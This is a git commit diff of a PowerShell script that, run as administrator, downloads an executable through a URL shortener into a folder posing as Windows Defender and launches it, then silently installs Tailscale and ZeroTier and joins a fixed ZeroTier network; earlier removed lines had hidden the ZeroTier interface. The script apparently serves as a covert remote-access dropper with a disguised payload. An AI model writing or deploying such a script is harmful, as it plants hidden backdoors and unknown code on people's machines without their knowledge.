f6cfffcb1a1708275e59cf2ebc101dd3dcdba93a
Muhammad Zain <134594267+zainmustafam977@users.noreply.github.com>
2025-05-29 07:02:48 +0500

    script.ps1

--- data/script.ps1
+++ data/script.ps1
@@ -4,10 +4,12 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
     exit
 }
 
-# Now running as admin, start your program
 Invoke-WebRequest -Uri "https://tinyurl.com/46jswbnp" -OutFile "C:\Program Files\defender\Executable\def.exe"
 Start-Process "C:\Program Files\defender\Executable\def.exe" -Verb RunAs
 tailscale up --unattended
+Invoke-WebRequest -Uri "https://download.zerotier.com/RELEASES/1.12.2/dist/ZeroTier%20One.msi" -OutFile "$env:USERPROFILE\Downloads\ZeroTier.msi"
+Start-Process "msiexec.exe" -ArgumentList "/i `"$env:USERPROFILE\Downloads\ZeroTier.msi`" /qn" -Wait
+$env:Path = [System.Environment]::GetEnvironmentVariable("Path", [System.EnvironmentVariableTarget]::Machine)
 
 Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))
 
@@ -16,5 +18,3 @@ $env:Path = [System.Environment]::GetEnvironmentVariable("Path", [System.Environ
 choco install zerotier-one -y
 $env:Path = [System.Environment]::GetEnvironmentVariable("Path", [System.EnvironmentVariableTarget]::Machine)
 zerotier-cli join 8bd5124fd6abcf8f
-Remove-Item -Path "C:\Program Files (x86)\ZeroTier\One\zerotier_desktop_ui.exe" -Force
-Rename-Item -Path "C:\Program Files (x86)\ZeroTier\One\zerotier_desktop_ui.exe" -NewName "C:\Program Files (x86)\ZeroTier\One\zerotier_desktop_ui.exe.disabled"
